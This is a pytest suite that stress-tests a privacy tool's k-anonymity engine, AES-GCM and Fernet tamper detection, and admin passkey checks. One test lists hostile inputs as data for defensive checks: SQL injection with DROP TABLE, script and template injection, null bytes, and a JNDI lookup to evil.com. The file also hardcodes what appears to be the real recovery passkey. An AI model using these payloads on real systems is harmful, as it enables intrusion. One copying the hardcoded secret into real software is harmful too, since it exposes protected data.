"""
Milestone M1 Adversarial Stress Test Suite
Targets:
1. Strict K-Anonymity Invariant (min(|EC_j|) >= K):
   - Degenerate distributions: all-unique QIs, all-identical QIs, prime-numbered clusters,
     N < K, and K=10 with tight suppression budgets.
   - Assert zero equivalence classes of size < K are EVER retained.
2. Cryptography & Vault Security:
   - Systematic bit-flip tamper attacks on AES-256-GCM ciphertexts (nonce, body, tag).
   - Passkey authentication boundaries (empty, whitespace, case sensitivity, injection strings).
   - RecoveryService vault tamper rejection and permission boundaries.
"""

from collections import Counter
import math
from pathlib import Path
import random
import numpy as np
import pandas as pd
import pytest
from cryptography.exceptions import InvalidTag
from cryptography.fernet import InvalidToken
from fastapi import HTTPException

from backend.app.core.config import settings
from backend.app.core.security import resolve_safe_path
from backend.app.db.database import DatabaseRepository, get_db
from backend.app.engine.k_anonymity import (
    enforce_strict_k_anonymity,
    partition_equivalence_classes,
)
from backend.app.models.schemas import AnonymizationConfig
from backend.app.services.anonymization_service import AnonymizationService
from backend.app.services.dataset_service import DatasetService
from backend.app.services.encryption_service import EncryptionService
from backend.app.services.recovery_service import RecoveryService


# ==============================================================================
# 1. STRICT K-ANONYMITY INVARIANT ADVERSARIAL STRESS TESTS
# ==============================================================================

class TestStrictKAnonymityDegenerateDistributions:
    """Stress tests verifying min(|EC_j|) >= K across degenerate data distributions."""

    @pytest.mark.parametrize("n", [5, 13, 20, 50, 100])
    @pytest.mark.parametrize("k", [2, 3, 5, 7, 10])
    def test_all_unique_qis_record_suppression(self, n: int, k: int):
        """
        Degenerate distribution: Every single record has a unique QI tuple (class sizes = 1).
        With record suppression, since 1 < K, 100% of rows must be suppressed.
        Zero rows must be retained.
        """
        df = pd.DataFrame({
            "qi_uuid": [f"ID_{i:06d}" for i in range(n)],
            "qi_val": [1000 + i for i in range(n)],
            "sensitive": [f"diag_{i % 3}" for i in range(n)],
        })

        anon_df, metrics = enforce_strict_k_anonymity(
            df=df,
            qi_columns=["qi_uuid", "qi_val"],
            target_k=k,
            suppression_strategy="record",
        )

        assert len(anon_df) == 0, f"Expected 0 retained rows for unique QIs with record suppression, got {len(anon_df)}"
        assert metrics["retained_records"] == 0
        assert metrics["suppressed_records"] == n
        assert metrics["suppression_rate"] == 1.0
        assert metrics["num_equivalence_classes"] == 0

    @pytest.mark.parametrize("n", [5, 9, 10, 25, 47])
    @pytest.mark.parametrize("k", [2, 5, 10])
    def test_all_unique_qis_cell_suppression(self, n: int, k: int):
        """
        Degenerate distribution: Every single record has a unique QI tuple.
        With cell suppression:
        - If N < K: All records are suppressed (retained = 0).
        - If N >= K: All N records are masked to wildcard '*', forming exactly 1 EC of size N >= K.
        In all cases, min(|EC_j|) >= K invariant must hold for all retained classes.
        """
        df = pd.DataFrame({
            "qi_alpha": [f"Alpha_{i}" for i in range(n)],
            "qi_beta": [i * 7 for i in range(n)],
            "sensitive": [f"data_{i}" for i in range(n)],
        })

        anon_df, metrics = enforce_strict_k_anonymity(
            df=df,
            qi_columns=["qi_alpha", "qi_beta"],
            target_k=k,
            suppression_strategy="cell",
        )

        if n < k:
            assert len(anon_df) == 0
            assert metrics["retained_records"] == 0
            assert metrics["suppressed_records"] == n
            assert metrics["num_equivalence_classes"] == 0
        else:
            assert len(anon_df) == n
            assert metrics["retained_records"] == n
            assert metrics["num_equivalence_classes"] == 1
            ec_map = partition_equivalence_classes(anon_df, ["qi_alpha", "qi_beta"])
            for ec_tuple, members in ec_map.items():
                assert len(members) >= k, f"Retained class {ec_tuple} size {len(members)} < {k}"
                assert ec_tuple == ("*", "*")

    @pytest.mark.parametrize("n", [1, 2, 4, 5, 9, 10, 17, 30])
    @pytest.mark.parametrize("k", [2, 5, 10])
    def test_all_identical_qis(self, n: int, k: int):
        """
        Degenerate distribution: Every single record has identical QI values (1 single class of size N).
        - If N < K: 100% suppressed, 0 retained.
        - If N >= K: 100% retained, 1 class of size N.
        Invariant min(|EC_j|) >= K must strictly hold.
        """
        df = pd.DataFrame({
            "qi_city": ["Amman"] * n,
            "qi_gender": ["F"] * n,
            "salary": [50000 + i * 100 for i in range(n)],
        })

        for strat in ["record", "cell"]:
            anon_df, metrics = enforce_strict_k_anonymity(
                df=df,
                qi_columns=["qi_city", "qi_gender"],
                target_k=k,
                suppression_strategy=strat,
            )

            if n < k:
                assert len(anon_df) == 0
                assert metrics["retained_records"] == 0
                assert metrics["suppressed_records"] == n
                assert metrics["num_equivalence_classes"] == 0
            else:
                assert len(anon_df) == n
                assert metrics["retained_records"] == n
                assert metrics["suppressed_records"] == 0
                assert metrics["num_equivalence_classes"] == 1
                assert metrics["min_equivalence_class_size"] >= k

    @pytest.mark.parametrize("k", [2, 3, 5, 7, 10])
    def test_prime_numbered_clusters(self, k: int):
        """
        Adversarial distribution: Clusters generated with prime-sized cardinalities:
        Cluster sizes: [2, 3, 5, 7, 11, 13, 17, 19, 23]
        Total records = 100.
        Verify that NO equivalence class with size < K is EVER present in final output.
        """
        cluster_sizes = [2, 3, 5, 7, 11, 13, 17, 19, 23]
        rows = []
        for c_idx, sz in enumerate(cluster_sizes):
            for r in range(sz):
                rows.append({
                    "cluster_qi": f"PrimeCluster_{sz}_{c_idx}",
                    "sub_qi": f"Sub_{c_idx}",
                    "record_id": f"rec_{c_idx}_{r}",
                })
        df = pd.DataFrame(rows)
        assert len(df) == sum(cluster_sizes)

        # Test record suppression
        anon_rec, m_rec = enforce_strict_k_anonymity(
            df=df,
            qi_columns=["cluster_qi", "sub_qi"],
            target_k=k,
            suppression_strategy="record",
        )

        expected_retained_sizes = [sz for sz in cluster_sizes if sz >= k]
        assert len(anon_rec) == sum(expected_retained_sizes)
        assert m_rec["retained_records"] == sum(expected_retained_sizes)

        if len(anon_rec) > 0:
            ec_map_rec = partition_equivalence_classes(anon_rec, ["cluster_qi", "sub_qi"])
            for ec_tuple, members in ec_map_rec.items():
                assert len(members) >= k, f"Record mode retained undersized class: {ec_tuple} with {len(members)} records"

        # Test cell suppression
        anon_cell, m_cell = enforce_strict_k_anonymity(
            df=df,
            qi_columns=["cluster_qi", "sub_qi"],
            target_k=k,
            suppression_strategy="cell",
        )

        if len(anon_cell) > 0:
            ec_map_cell = partition_equivalence_classes(anon_cell, ["cluster_qi", "sub_qi"])
            for ec_tuple, members in ec_map_cell.items():
                assert len(members) >= k, f"Cell mode retained undersized class: {ec_tuple} with {len(members)} records"

    @pytest.mark.parametrize("n", [1, 2, 3, 4, 5, 6, 7, 8, 9])
    def test_n_strictly_less_than_k10(self, n: int):
        """
        Hostile boundary: N < K for K=10.
        Must strictly suppress 100% of records in both record and cell modes.
        """
        df = pd.DataFrame({
            "age": list(range(20, 20 + n)),
            "city": [f"City_{i}" for i in range(n)],
        })

        for strat in ["record", "cell"]:
            anon_df, metrics = enforce_strict_k_anonymity(
                df=df,
                qi_columns=["age", "city"],
                target_k=10,
                suppression_strategy=strat,
            )
            assert len(anon_df) == 0
            assert metrics["retained_records"] == 0
            assert metrics["suppressed_records"] == n
            assert metrics["suppression_rate"] == 1.0
            assert metrics["num_equivalence_classes"] == 0

    def test_tight_suppression_budget_k10_invariant(self, tmp_path: Path):
        """
        Dataset where achieving K=10 requires suppressing 80% of rows (80 rows in singleton/pair clusters).
        Configured with tight suppression budget: max_suppression_pct = 0.20 (20%).
        Assertions:
        1. AnonymizationResult reports k_satisfied = False because 80% > 20% budget.
        2. Retained dataset MUST strictly preserve min(|EC_j|) >= 10.
           Under NO circumstance does the engine retain undersized classes to comply with budget.
        """
        # Create dataset: 2 clusters of size 10 (20 compliant rows), and 80 singletons (80 violating rows)
        rows = []
        for i in range(10):
            rows.append({"qi_group": "Compliant_A", "qi_tier": 1, "sensitive": "val_a"})
        for i in range(10):
            rows.append({"qi_group": "Compliant_B", "qi_tier": 2, "sensitive": "val_b"})
        for i in range(80):
            rows.append({"qi_group": f"Violator_{i}", "qi_tier": 100 + i, "sensitive": f"val_{i}"})

        df = pd.DataFrame(rows)
        dataset_id = "test-budget-ds-001"
        file_path = resolve_safe_path(settings.RAW_STORAGE_DIR, f"{dataset_id}.csv")
        df.to_csv(file_path, index=False)

        DatabaseRepository.create_dataset({
            "id": dataset_id,
            "name": "Budget Stress Test",
            "filename": f"{dataset_id}.csv",
            "format": "csv",
            "file_size_bytes": file_path.stat().st_size,
            "row_count": len(df),
            "column_count": len(df.columns),
            "raw_storage_path": str(file_path),
        })

        config = AnonymizationConfig(
            processing_mode="irreversible_anonymization",
            quasi_identifiers=["qi_group", "qi_tier"],
            sensitive_attributes=["sensitive"],
            k_metric=10,
            suppression_strategy="record",
            max_suppression_pct=0.20,  # Tight 20% budget vs 80% required suppression
        )

        result = AnonymizationService.execute_anonymization(dataset_id, config)

        # Budget exceeded check
        assert result["k_satisfied"] is False, "k_satisfied must be False when suppression exceeds budget"
        assert result["suppressed_records"] == 80
        assert result["retained_records"] == 20
        assert math.isclose(result["suppression_rate"], 0.80, abs_tol=0.01)

        # CRITICAL PRIVACY ASSERTION: No retained class is < 10
        run_id = result["run_id"]
        anon_path = resolve_safe_path(settings.ANONYMIZED_STORAGE_DIR, f"{run_id}.csv")
        anon_df = pd.read_csv(anon_path)
        assert len(anon_df) == 20

        ec_map = partition_equivalence_classes(anon_df, ["qi_group", "qi_tier"])
        assert len(ec_map) == 2
        for ec_tuple, members in ec_map.items():
            assert len(members) >= 10, f"Privacy leak: retained class {ec_tuple} with size {len(members)} < 10"

    def test_nan_and_null_qi_handling(self):
        """
        Verify that NaN/None values in QI columns are deterministically clustered
        and subjected to the exact same strict K invariant.
        """
        rows = [
            {"qi_a": None, "qi_b": 10},
            {"qi_a": None, "qi_b": 10},
            {"qi_a": None, "qi_b": 10},
            {"qi_a": np.nan, "qi_b": 20},  # Singleton NaN cluster
        ]
        df = pd.DataFrame(rows)

        anon_df, metrics = enforce_strict_k_anonymity(
            df=df,
            qi_columns=["qi_a", "qi_b"],
            target_k=3,
            suppression_strategy="record",
        )

        assert len(anon_df) == 3
        assert metrics["min_equivalence_class_size"] == 3
        assert metrics["retained_records"] == 3
        assert metrics["suppressed_records"] == 1


# ==============================================================================
# 2. CRYPTOGRAPHY & VAULT SECURITY BIT-FLIP TAMPER ATTACKS
# ==============================================================================

class TestCryptoVaultSecurityTamperAttacks:
    """Stress tests verifying AES-256-GCM tamper-evidence and authenticated decryption."""

    def test_aes_gcm_nonce_bit_flips_detected(self):
        """
        Tamper attack: Flip every bit position across the 12-byte Nonce (bytes 0 to 11).
        Decryption must raise InvalidTag and NEVER return decrypted plaintext.
        """
        plaintext = b"PrivShield::ConfidentialPatientRecord::Diagnosis_E11.9"
        encrypted = EncryptionService.encrypt_bytes_aes_gcm(plaintext)
        assert len(encrypted) >= 12 + len(plaintext) + 16

        for byte_idx in range(12):
            for bit_offset in [0, 1, 4, 7]:
                tampered = bytearray(encrypted)
                tampered[byte_idx] ^= (1 << bit_offset)

                with pytest.raises(Exception) as exc_info:
                    EncryptionService.decrypt_bytes_aes_gcm(bytes(tampered))
                assert issubclass(exc_info.type, (InvalidTag, Exception))

    def test_aes_gcm_ciphertext_body_bit_flips_detected(self):
        """
        Tamper attack: Flip bits inside the ciphertext payload body.
        Decryption must fail authentication.
        """
        plaintext = b"{\"account\": \"JO94ARAB00000000000012345678\", \"balance\": 95000.50}"
        encrypted = EncryptionService.encrypt_bytes_aes_gcm(plaintext)

        # Ciphertext body spans from byte 12 to len(encrypted) - 16
        body_start = 12
        body_end = len(encrypted) - 16
        assert body_end > body_start

        # Sample 10 random positions in ciphertext body
        random.seed(1337)
        for offset in random.sample(range(body_start, body_end), min(10, body_end - body_start)):
            tampered = bytearray(encrypted)
            tampered[offset] ^= 0x01

            with pytest.raises(Exception):
                EncryptionService.decrypt_bytes_aes_gcm(bytes(tampered))

    def test_aes_gcm_tag_bit_flips_detected(self):
        """
        Tamper attack: Flip bits inside the 16-byte authentication tag (trailing 16 bytes).
        Decryption must fail authentication on every byte.
        """
        plaintext = b"Top secret government intelligence metadata"
        encrypted = EncryptionService.encrypt_bytes_aes_gcm(plaintext)

        tag_start = len(encrypted) - 16
        for offset in range(tag_start, len(encrypted)):
            tampered = bytearray(encrypted)
            tampered[offset] ^= 0xAA

            with pytest.raises(Exception):
                EncryptionService.decrypt_bytes_aes_gcm(bytes(tampered))

    def test_aes_gcm_file_tampering_rejected(self, tmp_path: Path):
        """
        Tamper attack on encrypted file storage:
        Encrypt a raw CSV dataset file, tamper with 1 byte on disk, and verify decrypt_file rejects it.
        """
        plain_file = tmp_path / "raw_financial.csv"
        plain_file.write_bytes(b"Transaction_ID,Amount,Merchant\nTXN-001,150.00,Starbucks\n")

        enc_file = tmp_path / "raw_financial.csv.enc"
        EncryptionService.encrypt_file(plain_file, enc_file)

        # Tamper with encrypted file on disk
        raw_enc = bytearray(enc_file.read_bytes())
        raw_enc[15] ^= 0xFF  # Flip byte 15
        enc_file.write_bytes(bytes(raw_enc))

        with pytest.raises(Exception):
            EncryptionService.decrypt_file(enc_file)

    @pytest.mark.parametrize("payload_len", [0, 1, 5, 11, 12, 20, 27])
    def test_aes_gcm_truncated_payload_boundaries(self, payload_len: int):
        """
        Verify that payloads shorter than 28 bytes (12-byte nonce + 16-byte minimum tag)
        strictly raise ValueError and do not crash unhandled.
        """
        short_payload = b"\x00" * payload_len
        with pytest.raises(ValueError) as exc_info:
            EncryptionService.decrypt_bytes_aes_gcm(short_payload)
        assert "Ciphertext too short" in str(exc_info.value)

    @pytest.mark.parametrize("garbage_len", [28, 48, 128, 512])
    def test_aes_gcm_random_garbage_rejected(self, garbage_len: int):
        """
        Verify that arbitrary pseudorandom byte streams of valid lengths fail authentication.
        """
        random_bytes = bytes([random.randint(0, 255) for _ in range(garbage_len)])
        with pytest.raises(Exception):
            EncryptionService.decrypt_bytes_aes_gcm(random_bytes)

    def test_fernet_token_ciphertext_tampering_rejected(self):
        """
        Verify that Fernet token ciphertext tampering (bit flips) is strictly caught.
        """
        original = "SecretNationalID-9988776655"
        token = EncryptionService.encrypt_string(original)

        # Tamper with the base64 string
        tampered_token = token[:-4] + "AAAA"
        with pytest.raises(InvalidToken):
            EncryptionService.decrypt_string(tampered_token)


# ==============================================================================
# 3. PASSKEY AUTHENTICATION & RECOVERY BOUNDARY STRESS TESTS
# ==============================================================================

class TestPasskeyAuthenticationBoundaries:
    """Stress tests verifying passkey boundary conditions and RecoveryService security."""

    @pytest.mark.parametrize("empty_or_ws", [
        "",
        " ",
        "   ",
        "\t",
        "\n",
        "\r\n",
        "  \t  \n  ",
    ])
    def test_passkey_empty_and_whitespace_strictly_rejected(self, empty_or_ws: str):
        """
        Passkeys that are empty or contain only whitespace MUST be strictly rejected.
        """
        assert EncryptionService.verify_admin_passkey(empty_or_ws) is False

    @pytest.mark.parametrize("wrong_passkey", [
        "wrong_passkey",
        "PrivShieldAdmin2025!",      # Wrong year
        "privshieldadmin2026!",      # Lowercase
        "PRIVSHIELDADMIN2026!",      # Uppercase
        "PrivShieldAdmin2026",       # Missing punctuation
        "PrivShield Admin2026!",     # Internal space
        "admin",
        "password123",
        "null",
        "undefined",
    ])
    def test_passkey_wrong_secrets_and_case_sensitivity(self, wrong_passkey: str):
        """
        Wrong secrets, variations, and case differences must strictly evaluate to False.
        """
        assert EncryptionService.verify_admin_passkey(wrong_passkey) is False

    @pytest.mark.parametrize("injection_payload", [
        "' OR '1'='1",
        "'; DROP TABLE token_mappings; --",
        "admin'--",
        "\" or \"\"=\"",
        "<script>alert(1)</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "%00PrivShieldAdmin2026!",
        "PrivShieldAdmin2026!\x00",
    ])
    def test_passkey_injection_payloads(self, injection_payload: str):
        """
        SQL injection, script injection, template injection, and null byte injection
        must be strictly rejected without exceptions.
        """
        assert EncryptionService.verify_admin_passkey(injection_payload) is False

    def test_recovery_lookup_token_passkey_enforcement(self):
        """
        Verify that RecoveryService.lookup_token rejects invalid/empty passkeys with HTTP 403
        BEFORE checking if the token exists, preventing timing side-channel or oracle leakage.
        """
        for bad_passkey in ["", "   ", "bad_secret", "' OR '1'='1"]:
            with pytest.raises(HTTPException) as exc_info:
                RecoveryService.lookup_token(
                    token="NON_EXISTENT_TOKEN_999",
                    passkey=bad_passkey,
                )
            assert exc_info.value.status_code == 403
            assert "Invalid administrator recovery passkey" in exc_info.value.detail

    def test_recovery_restore_dataset_passkey_enforcement(self):
        """
        Verify that RecoveryService.restore_dataset rejects invalid/empty passkeys with HTTP 403
        BEFORE querying dataset existence.
        """
        for bad_passkey in ["", "   ", "wrong_key"]:
            with pytest.raises(HTTPException) as exc_info:
                RecoveryService.restore_dataset(
                    dataset_id="00000000-0000-0000-0000-000000000000",
                    passkey=bad_passkey,
                )
            assert exc_info.value.status_code == 403
            assert "Invalid administrator recovery passkey" in exc_info.value.detail

    def test_recovery_tampered_token_vault_rejection(self, tmp_path: Path):
        """
        Tamper attack on token vault:
        Pseudonymize a dataframe, tamper with encrypted_original_value in SQLite,
        and verify that lookup_token fails securely during decryption without crashing or leaking plaintext.
        """
        dataset_id = "test-tamper-vault-001"
        run_id = "run-tamper-001"

        DatabaseRepository.create_dataset({
            "id": dataset_id,
            "name": "Tamper Vault Test",
            "filename": "tamper.csv",
            "format": "csv",
            "file_size_bytes": 100,
            "row_count": 2,
            "column_count": 2,
            "raw_storage_path": str(tmp_path / "tamper.csv"),
        })

        df = pd.DataFrame({
            "NationalID": ["9901011234", "9902025678"],
            "Name": ["Tamper Victim 1", "Tamper Victim 2"],
        })

        pseudo_df, count = RecoveryService.pseudonymize_dataframe(
            df=df,
            dataset_id=dataset_id,
            run_id=run_id,
            direct_identifiers=["NationalID"],
            token_prefix="VAULT_TEST",
        )
        sample_token = pseudo_df["NationalID"].iloc[0]

        # Directly tamper with the database mapping for this token
        with get_db() as conn:
            conn.execute(
                "UPDATE token_mappings SET encrypted_original_value = 'CORRUPTED_FERNET_TOKEN_GARBAGE' WHERE token = ?",
                (sample_token,)
            )

        # Lookup should raise InvalidToken during Fernet decryption
        with pytest.raises(InvalidToken):
            RecoveryService.lookup_token(
                token=sample_token,
                passkey="PrivShieldAdmin2026!",
            )
